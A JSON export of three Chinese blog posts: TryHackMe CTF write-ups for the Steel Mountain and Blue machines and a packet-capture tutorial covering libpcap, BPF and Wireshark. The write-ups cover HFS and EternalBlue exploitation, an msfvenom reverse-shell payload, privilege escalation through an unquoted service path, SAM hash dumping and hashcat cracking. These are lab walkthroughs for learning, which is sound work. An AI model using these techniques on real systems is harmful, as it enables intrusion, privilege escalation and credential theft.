[{"id":"11041d9251423dbeb0d78e2c3336a544","title":"Steel Mountain CTF - TryHackMe.com","content":"\n\n\n\n\n\n\n\n\nSteel Mountain是TryHackMe的Windows靶机，基于Mr Robot Tv系列。\n侦察探测开启TryHackMe靶机后，使用ping命令检测主机是否启动并运行。ping命令执行成功后，使用nmap进行端口扫描。从扫描结果中可以发现，这个靶机运行了SMB服务(445)，RDP服务(3389)以及两个web服务(80,8080)。访问80端口的web服务，。这里有一个小工具TinEye,根据图片反向查找包含该图片的网址链接，这在我们分析网站时可能会提供意想不到的效果。\n获取访问在扫描的结果中，我们还看到了8080也是开启的，打开网页发现是靶机上部署了一个HFS文件服务器。在exploit-db搜索hfs发现该服务的特定版本存在存在可以利用的漏洞.使用nmap扫描版信息。拿到后，使用Metasploit查找该服务的expolit。从结果中看到该服务确实存在exploit，利用Metasploit进行exploit。此漏洞的payload默认使用windows&#x2F;meterpreter&#x2F;reverse_tcpMetasploit已经打开了meterpreter会话，那接下来就可以进行提权了。\nMetaSploit特权升级靶机建议使用PowerUp进行提权，PowerUP所做的事情就是寻找可能存在的漏洞，帮助提权。\n查看当前的metepreter会话的用户，为STEELMOUNTAIN\\bill,要使用PowerUP需要将PowerUP.ps1文件使用upload命令上传到靶机上。上传成功后，需要在Meterpreter shell中使用load powershell加载Powershell，并输入powershell_shell切换到Powershell，接下来执行PowerUp.ps1,然后输入Invoke-AllChecks，这会在靶机上运行一系列扫描。从PowerUp的扫描结果中我们发现AdvancedSystemcareService9服务存在Unquoted Service Paths(UPS)漏洞。\n\n\n\n\n\n\n\n\n\n知识点：Unquoted Service Path 是什么？当一个服务被创建，其可执行路径包含空格并且没有被引号括起来时，会导致USP漏洞。这个漏洞允许用户获得特殊权限(只有当这个易受攻击的服务是以System权限运行)。在Windows中，如果服务没有用引号括起来并且有空格，它会将空格作为中断处理，并将服务路径的其他部分作为参数传递。知识点：LocalSystem？LocalSystem是预设的拥有本机所有权限的本地账户，这个账户跟通常的用户账户没有任何关联，也没有用户名和密码之类的凭证。这个服务账户可以打开注册表的HKEY_LOCAL_MACHINE\\Security键，当LocalSystem访问网络资源时，它是作为计算机的域账户使用的。 \n根据已经获取的信息进行分析，目前靶机上运行的AdvancedSystemcareService9服务存在USP漏洞，并且使用LocalSystem权限运行。如果利用USP漏洞将AdvancedSystemcareService9服务替换成恶意程序(例如反向Shell.exe),则该服务会在系统重启或服务重启时自动启动，我们就能在靶机上运行一个拥有LocalSystem权限的会话。\n接下来，我们使用msfvenom制作恶意程序，并且程序名称需要命名为“Advanced.exe”，因为系统顺序寻找执行文件:1.C:\\Program.exe2.C:\\Program Files(x86)\\IObit\\Advanced.exe\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.4.63.84 LPORT&#x3D;5555 -f exe -o .&#x2F;Advanced.exe\n\n-p: 选择一个payload\n-f: 生成的文件格式\n-o: 生成路径\n\n生成成功后使用upload命令将“Advanced.exe”上传至C:\\Program Files(x86)\\IObit\\目录下。另起一个MetaSploit窗口，使用exploit&#x2F;multi&#x2F;handler进行监听,修改options和默认payload。在Meterpreter会话中使用shell命令进入Windows shell会话中，停止和重启AdvancedSystemcareService9服务。重启服务后，exploit/multi/handler获得meterpreter会话。此时的会话并不稳定，我们需要使用migrate命令快速的将会话迁移到以NT AUTHORITY\\System运行的进程下。\n手动特权升级工具\n\n\n\n\n\n\n\n\n\nNamp\nMetaSploit\nmsfvenom\nPowerSploit\n\n参考文档\n\n\n\n\n\n\n\n\n\npowerup提权的方法\nPowerSploit\nWindows Privilege Escalation — Part 1 (Unquoted Service Path)\n内置系统账户:Local system&#x2F;Network service&#x2F;Local Service 区别\nGet-ModifiablePath\n\n","slug":"Steel Mountain CTF","date":"2022-03-17T17:29:47.695Z","categories_index":"CTF","tags_index":"tryhackme,Steel Mountain,PowerSploit","author_index":"剑三"},{"id":"9f9fe3f3013b488c2450ed12f2446a41","title":"Linux网络抓包","content":"通过网络抓包功能捕获指定IP和端口的网络数据包、分析数据包内容，帮助定位网络故障和分析攻击行为，从而识别出网络通信的安全风险,常用的网络抓包工具有wireshark、tcpdump、ngrep等。\n网络抓包环境网络不论传输什么样的数据，最终通过物理层传输的都是二进制，类似010101的bit流。想要进行抓包操作，就需要具备相应的网络环境。\n本地环境本地环境直接抓包本地网卡的进出的流量。不需要借助交换机就能抓取网络通信流量，这是最基本的抓包方式。\n交换机环境交换机环境是更为常见的方式，包括了端口镜像、ARP欺骗、MAC泛洪。\n网络抓包原理\n\n\n\n\n\n\n\n\nlibpcap flow involving data copy from kernel to user space.\nlibpcap(Packet Capture Library)数据包捕获函数库,是Unix&#x2F;Linux平台下的网络数据包捕获函数(Windows WinPcap)，它是一个独立于系统的用户层包捕获的API接口，为底层网络监测提供了一个可移植的框架。wireshark(linux)、tcpdupm、ngrep等抓包工具都依赖libpcap库。\n\nlibpcap主要由两部分组成：\n\n网络分接头(Network Tap):网络分接头从网络设备驱动程序（NIC driver）中收集数据拷贝，过滤器决定是否接收该数据包。\n数据过滤器(Packet Filter):libpcap 利用 BSD Packet Filter (BPF) 算法对网卡接收到的链路层数据包进行过滤。\n\nBPF 算法的基本思想：在有 BPF 监听的网络中，网卡驱动将接收到的数据包复制一份交给 BPF 过滤器，过滤器根据用户定义的规则决定是否接收此数据包以及需要拷贝该数据包的哪些内容，然后将过滤后的数据交给与过滤器相关联的上层应用程序。\nlibpcap 的包捕获机制：在数据链路层加一个旁路处理。当一个数据包到达网络接口时，libpcap 首先利用已经创建的类型为 PF_PACKET 的 Socket ，从位于链路层中的 NIC driver 中获得数据包的拷贝，再通过 Tap 函数将数据包发给 BPF 过滤器。BPF 过滤器根据用户已经定义好的过滤规则对数据包进行逐一匹配，匹配成功则放入内核缓冲区，进而传递给用户缓冲区，匹配失败则直接丢弃。如果没有设置过滤规则，所有数据包都将放入内核缓冲区，并传递给用户缓冲区。\nlibpcap使用流程:\n\n决定对那一个接口进行嗅探，如eth0。我们也可以用一个字符串来定义这个设备。\n\n初始化pcap。使用文件句柄传入需要嗅探的设备。同时支持多个设备的嗅探。\n\n设置BPF. 创建一个规则集合，编译并且使用它。这个过程分为三个阶段: \n\n1.规则集合被置于一个字符串内，并且被转换成能被pcap读的格式。\n2.编译该规则（就是调用一个不被外部程序使用的函数）。\n3.告诉pcap使用它来过滤数据包。\n\n\npcap进入它的主循环。在这个阶段内pcap一直工作到它接收了所有我们想要的包为止。每当它收到一个包（或者多个数据包）就调用另一个已经定义好的函数，这个函数可以做我们想要的任何工作，比如它可以剖析包的上层协议信息并给用户打印出结果，它可以将结果保存为一个文件，或者什么也不作。\n\n在嗅探到所需的数据后，我们要关闭会话并结束。\n\n\n\n\n\n\n\n\n\n\n\nTips: Python的Scapy库是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。Scapy 可以轻松地做到像扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)这样的传统任务。\n网络抓包工具由于wireshark(linux)、tcpdump、ngrep等工具都依赖的是libpcap库，所以抓取数据包、过滤数据包的方式都是一致的。\nwireshark：通过Protocol-Tree、Dissectors(包含700中协议)、Plugins可以对pcap文件(libpcap生成的文件)中的协议内容进行解码，并通过Display-Filters引擎进行过滤显示(协议与过滤字段)。\ntcpdump：对截获的数据并没有进行彻底解码，数据包内的大部分内容是使用十六进制的形式直接打印输出的。显然这不利于分析网络故障，通常的解决办法是先使用带-w参数的tcpdump 截获数据并保存到文件中，然后再使用其他程序(如Wireshark)进行解码分析。\nngrep：ngrep工具是grep命令的网络版，ngrep用于抓包，并可以通过正则表达式，过滤、获取指定样式的数据包。比起tcpdump查看更加方便，但是需要自行安装。\nWireSharkWireshark（导线鲨鱼，前称Ethereal，空灵）是一个免费开源的网络数据包分析软件。网络数据包分析软件的功能是截取网络数据包，并尽可能显示出最为详细的网络数据包资料。\n在GNU通用公共许可证的保障范围底下，用户可以以免费的代价获取软件与其代码，并拥有针对其源代码修改及定制的权利。（摘自维基百科）\n过滤器Wireshark有两种过滤器，一种是捕捉过滤器，一种是显示过滤器。\n捕捉过滤器：\n\n只抓取符合设置规则的数据包，并丢弃其他信息；\n是数据经过的第一层过滤器，用于控制捕捉数据的数量，以避免产生过大的日志文件\n\n显示过滤器：\n\n显示过滤器并不会丢弃信息，只是将不符合规则的数据隐藏起来；\n允许在日志文件中迅速准确地找到所需要的记录；\n\n它们的共同点就是都得遵循BPF规则语法。\n捕捉过滤器语法\n名词解释：\n\nProtocol(协议)常用值：ether、fddi、ip、arp、rarp、decnet、lat、sca、moprc、mopdl、tcp and udp等。如果没有特别指明某种协议，则默认使用所有支持的协议。  \nDirection(方向)常用值：src、dst、src and dst、src or dst。如果没有特别指明来源或目的地，则默认使用src or dst作为关键字。\nHost(s)：常用值：net、port、host、portrange。如果没有特别指定值，则默认使用host关键字。\nLogical Operations(逻辑运算)常用值：not、and、or。否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。\n\n常用BPF示例:\n来源或目的地是指定地址的包\nhost 192.168.0.123\nhost www.taobao.com\n\n范围内的包\nnet 192.168.0.0&#x2F;24\nor\nnet 192.168.0.0 mask 255.255.255.0\n\n抓取目的地是某范围的包\ndst net 192.168.0.0&#x2F;24\nor\ndst net 192.168.0.0 mask 255.255.255.0\n\n抓取来源是某范围的包\nsrc net 192.168.0.0&#x2F;24\nor\nsrc net 192.168.0.0 mask 255.255.255.0\n\n仅抓取DNS(端口是53)的包\nport 53\n\ntcp dst port 3128\n显示目的TCP端口为3128的封包。\n\nip src host 10.1.1.1\n显示来源IP地址为10.1.1.1的封包。\n\nhost 10.1.2.3\n显示目的或来源IP地址为10.1.2.3的封包。\n\nsrc portrange 2000-2500\n显示来源为UDP或TCP，并且端口号在2000至2500范围内的封包。\n\nnot imcp\n显示除了icmp以外的所有封包。（icmp通常被ping工具使用）\n\nsrc host 10.7.2.12 and not dst net 10.200.0.0&#x2F;16\n显示来源IP地址为10.7.2.12，但目的地不是10.200.0.0&#x2F;16的封包。\n\n(src host 10.4.1.12 or src net 10.6.0.0&#x2F;16) and tcp dst portrange 200-10000 and dst net 10.0.0.0&#x2F;8\n显示来源IP为10.4.1.12或者来源网络为10.6.0.0&#x2F;16，目的地TCP端口号在200至10000之间，并且目的位于网络10.0.0.0&#x2F;8内的所有封包。\n显示过滤器语法\n名词解释：\n\nProtocol(协议)可以使用大量位于OSI模型第2至7层协议。常用值：IP、TCP、DNS、SSH\nString1，String2(可选项)协议的子类。(例如：ip.checksum.status)\nComparison operators(比较运算符)\nLogical expressions(逻辑运算符)\n\n常见BPF示例：\n过滤从某地址发出的请求\nip.src&#x3D;&#x3D;192.168.8.60\n\n过滤发送到某地址的请求\nip.dst&#x3D;&#x3D;192.168.8.60\n\n过滤http协议\nhttp\n\n过滤某地址\nhttp.request.uri&#x3D;&#x3D;&quot;&#x2F;projectname&#x2F;a.html&quot;\n\n过滤全地址（它与uri的区别是，包含host）\nhttp.request.full_uri&#x3D;&#x3D;&quot;www.mydomain.com&#x2F;projectname&#x2F;a.html&quot;\n\nsnmp || dns || icmp\t\n显示SNMP或DNS或ICMP封包。\n\nip.addr &#x3D;&#x3D; 10.1.1.1\n显示来源或目的IP地址为10.1.1.1的封包。\n\nip.src !&#x3D; 10.1.2.3 or ip.dst !&#x3D; 10.4.5.6\n显示来源不为10.1.2.3或者目的不为10.4.5.6的封包。\n\nip.src !&#x3D; 10.1.2.3 and ip.dst !&#x3D; 10.4.5.6\n显示来源不为10.1.2.3并且目的IP不为10.4.5.6的封包。\n\n\ntcp.port &#x3D;&#x3D; 25\t\n显示来源或目的TCP端口号为25的封包。\n\ntcp.dstport &#x3D;&#x3D; 25\t\n显示目的TCP端口号为25的封包。\n\ntcp.flags\t\n显示包含TCP标志的封包。\n\ntcp.flags.syn &#x3D;&#x3D; 0x02\t\n显示包含TCP SYN标志的封包。\n\n如果对某些不熟悉的协议要进行过滤的话，可以通过Display Filter Expression菜单查看所有支持的协议表达式：\n报文解析Wireshark捕捉的数据报文展示从物理层-&gt; 以太网 -&gt; 协议层。不同的协议层，展示的报文信息都不尽相同。\n物理层\n# 19号帧， 线路98字节，实际捕获98字节\nFrame 19: 98 bytes on wire (784 bits), 98 bytes captured (784 bits) on interface -, id 0\n    \n    # 接口id\n    Interface id: 0 (-)    \n    \n    # 封装类型\n    Encapsulation type: Ethernet (1)    \n    \n    # 捕获时间\n    Arrival Time: May 20, 2021 22:03:00.811570000 中国标准时间    \n    [Time shift for this packet: 0.000000000 seconds]\n    Epoch Time: 1621519380.811570000 seconds\n\n    # 此包与前1个捕获帧的时间间隔\n    [Time delta from previous captured frame: 1.000881000 seconds]\n\n    # 此包与前1个显示帧的时间间隔\n    [Time delta from previous displayed frame: 1.000881000 seconds]\n\n    # 此包与第1帧的时间间隔\n    [Time since reference or first frame: 19.309028000 seconds]\n\n    # 帧序号\n    Frame Number: 19\n\n    # 帧长度\n    Frame Length: 98 bytes (784 bits)\n\n    # 捕获长度\n    Capture Length: 98 bytes (784 bits)\n\n    # 此帧是否做了标记：否\n    [Frame is marked: False]\n\n    # 此帧是否被忽略：否\n    [Frame is ignored: False]\n\n    # 帧内封装的协议层次结构\n    [Protocols in frame: eth:ethertype:ip:icmp:data]\n\n    # 著色标记的协议名词\n    [Coloring Rule Name: ICMP]\n    \n    # 著色规则\n    [Coloring Rule String: icmp || icmpv6]\n以太网层\n# 源MAC地址，目标MAC地址\nEthernet II, Src: 0c:fc:d4:00:52:00 (0c:fc:d4:00:52:00), Dst: 0c:fc:d4:fb:76:00 (0c:fc:d4:fb:76:00)\n\n    # 目标MAC地址\n    Destination: 0c:fc:d4:fb:76:00 (0c:fc:d4:fb:76:00)\n        Address: 0c:fc:d4:fb:76:00 (0c:fc:d4:fb:76:00)\n\n        #  LG位：全局唯一地址（出厂默认）\n        .... ..0. .... .... .... .... &#x3D; LG bit: Globally unique address (factory default)\n\n        # LG位：独特地址（单广播）\n        .... ...0 .... .... .... .... &#x3D; IG bit: Individual address (unicast)\n    \n    # 源MAC地址\n    Source: 0c:fc:d4:00:52:00 (0c:fc:d4:00:52:00)\n        Address: 0c:fc:d4:00:52:00 (0c:fc:d4:00:52:00)\n        .... ..0. .... .... .... .... &#x3D; LG bit: Globally unique address (factory default)\n        .... ...0 .... .... .... .... &#x3D; IG bit: Individual address (unicast)\n\n    # Type代表以太网帧中封装了何种协议，常见的有IPv4: 0x0800、ARP:0x0806、IPV6: 0x86DD等...\n    Type: IPv4 (0x0800)\nTCP三次握手在进行分析之前，先看下TCP&#x2F;IP的报文格式：\n\nSYN（SYNchronization）标志：当 SYN 被置为 1，而 ACK 为0时， 说明这是一个连接请求报文段，若对方同意建立连接，则应在应答报文中将 SYN 和 ACK 都置为 1。\nACK（ACKnowlegment）：仅当 ACK 被置为 1 时，确认号字段才有效。 TCP 规定在连接建立后的所有传输报文都必须把 ACK 置 1。\nFIN（Finish）：用来释放一个连接。 当 FIN 被置 1 时，说明此报文的发送方的数据已经发送完毕，要求释放连接。\nRST（Reset）：当该位有效时，表面 TCP 连接中出现严重错误，比如一方中途崩溃，或者网络极度拥塞，导致大面积丢包，数据长时间无法到达对方，则接下来的传输必须重新建立。该位还可以用来拒绝一个非法的报文段。\nPSH（Push）：当PSH 被置为1 时， 会被立即推出，不会等待其他数据进入缓冲区。当接受端收到 PSH 被置 1 的数据包时，立即将该分段上交到对应的应用程序。(这就是SSH协议基于TCP的同时又可以对用户输入的短小指令可以快速响应的原因)\nURG（Urgent）：此标志位逐渐被淘汰。\n\n\n通过在GNS3模拟访问过程，并进行监听：Pc1为Server端：\nimport socket        \n \ns = socket.socket()  \nhost = '192.168.1.2' \nport = 12345         \ns.bind((host, port)) \n \ns.listen(5)          \nwhile True:\n    c,addr = s.accept()  \n    print '连接地址：', addr\n    c.send('welcome gns3 server')\n    c.close() \nPc2为Client端：\nimport socket               \n \ns = socket.socket()         \nhost = '192.168.1.2' \nport = 12345               \n \ns.connect((host, port))\nprint s.recv(1024)\ns.close()\n执行代码后在Wireshark显示器中可以看到8个TCP数据包传输：第一次握手:客户端传送一个TCP，标志位为SYN&#x3D;1，序号seq为Sequence number&#x3D;0， 40338 -&gt; 12345，代表客戶端请求建立连接第二次握手:服务器向客户端返回一个数据包，SYN&#x3D;1，ACK&#x3D;1，12345 -&gt; 40338，将确认序号设定为客户端的序号seq+1，即0+1&#x3D;1第三次握手:客户端收到服务器发来的包后检查确认序号(Acknowledgement Number)是否正确，即第一次传送的序号seq加1（X+1&#x3D; 0+1&#x3D;1）。以及标志位ACK是否为1。若正确，客户端会再向服务器端传送一个数据包，SYN&#x3D;0，ACK&#x3D;1，确认序号(Acknowledgement Number)&#x3D;Y+1&#x3D;0+1&#x3D;1，并且把服务器发来ACK的序号seq(Sequence number)加1传送给对方，传送序号seq为X+1&#x3D; 0+1&#x3D;1。客户端收到后确认序号值与ACK&#x3D;1，53992 -&gt; 80，至此，一次TCP连线就此建立。\n","slug":"Linux网络抓包","date":"2022-03-17T17:29:47.691Z","categories_index":"Linux","tags_index":"network,libpcap,抓包","author_index":"剑三"},{"id":"f0b7d768b5cba845448b4aeeb8a9d261","title":"Blue CTF - TryHackMe.com","content":"Blue CTF专注于通过利用SMB漏洞、使用Meterpreter提升权限、破解NTLM哈希以及遍历目录找到3个Flag。\n侦察开启TryHackMe上的靶机，使用ping命令检查主机是否启动并开始运行。\n确认靶机已经启动后，使用Nmap执行TCP SYN(sS)端口扫描，并对端口服务进行漏洞扫描(--script=vuln)，同时将其输出到blueNmapOutPut(-OA)。\nsudo nmap 10.10.120.227 -sS --script&#x3D;vuln -oA blueNmapOotPut\n\n漏洞扫描的输出表明当前靶机存在MS17-010SMB漏洞。MS17-010允许攻击者在Windows系统上执行远程代码，靶机使用了SMBv1,并且没有更新Window安全更新(4013389),导致该漏洞依旧存在。\n获得访问权得知靶机可以存在MS2017-010漏洞后，使用Metasploite搜索MS17-010 exploit。\n在msfconsole的搜索结果中，我们选择使用广泛流传的ms_17_010_eternalblue(永恒之蓝)漏洞进行攻击。\n查看options,修改必要的参数：RHOSTS、LHOST，然后设置Playload。\n执行runorexploit。\nEternalBlue漏洞利用成功，我们已经拿到了靶机的的shell权限。\n权限升级为了对靶机进行权限升级，我们需要将shell会话升级为Meterpreter会话。Meterpreter允许攻击者像shell一样与靶机交互，并为攻击提供了利用DLL注入机器内存直接执行Metasploit Playload的功能。\nDLL注入是恶意软件使用的一种代码注入形式，通过强制合法进程将恶意DLL加载到进程内存中来执行恶意代码。DLL注入的工作原理是在合法进程中分配内存，并将恶意DLL的路径复制到合法进程地址空间分配的内存中。然后使用指向Windows的LoadLibrary()函数的指针执行一个新线程，并使用DLL的路径名指向分配的内存，从而允许执行恶意代码。\n为了将shell升级到Meterpreter会话，我使用了Metasploit的shell_to_meterpreter模块。执行Ctrl + z让刚获得的shell会话转入后台运行。\n使用Metasploit搜索shell_to_meterpreter。\n查看options,修改必要的参数：SESSION(此处设置为我们隐藏在后台的shell id编号),执行exploit。\n成功后通过session命令可以看到我们已经获得了meterpreter会话。\n为了将权限提升到NT AUTHORITY，我们需要劫持靶机上一个NT AUTHORITY\\SYSTEM用户下的合法进程。进入meterpreter会话使用ps命令查看当前靶机上运行的进程都有哪些。\n最终，我们选择劫持SearchIndexer.exe进程，使用migrate命令将meterpreter会话迁移到SearchIndexer.exe进程中，成功后，使用getuid查看当前用户。\n劫持SearchIndexer.exe进程使我们能够以NT AUTHORITY\\SYSTEM执行代码，使用hashdump(post&#x2F;windwos&#x2F;gather&#x2F;hashdump)命令获取Windows用户账号的密码哈希值，该命令会转储安全账号管理器(SAM)数据库的内容。SAM数据库文件存储了Windows操作系统(包括Windwos 10)上的散列用户密码。\n破解密码哈希转储的Windows用户凭证使用NTLM进行哈希处理。转储凭据可以分为4个部分：用户、相对标识符(RID)、LM哈希和NT哈希。例如，用户Jon的凭据可以拆分为：\n\n用户名:Jon\nRID: 1000\nLM Hash: aad3b435b51404eeaad3b435b51404ee\nNT Hash: ffb43f0de35be4d9917ac0cc8ad57f8d\n\n为了破解密码，将凭据中的NT Hash复制到文件中，使用HashCat对NT哈希执行wordlist攻击。攻击词表使用kali中自带的rockyou.txt。\nhashcat -m 1000 -a 0 .&#x2F;hashes.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rock\n\n-a: 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击\n-m: 指定要破解的hash类型，如果不指定类型，则默认是MD5(NTLM类型为1000)\n\n\n寻找Flag使用search命令查找匹配flag*.txt的文件,使用cat命令查看文件，获取flag。\n参考文档\n\n\n\n\n\n\n\n\n\nWindows系统的dll注入\n后渗透之meterpreter使用攻略\nPRIVILEGE ESCALATION\nHackTheBox Writeup: Grandpa\n\n","slug":"Blue CTF","date":"2022-03-17T17:29:47.327Z","categories_index":"CTF","tags_index":"tryhackme,eternalblue,windows","author_index":"剑三"}]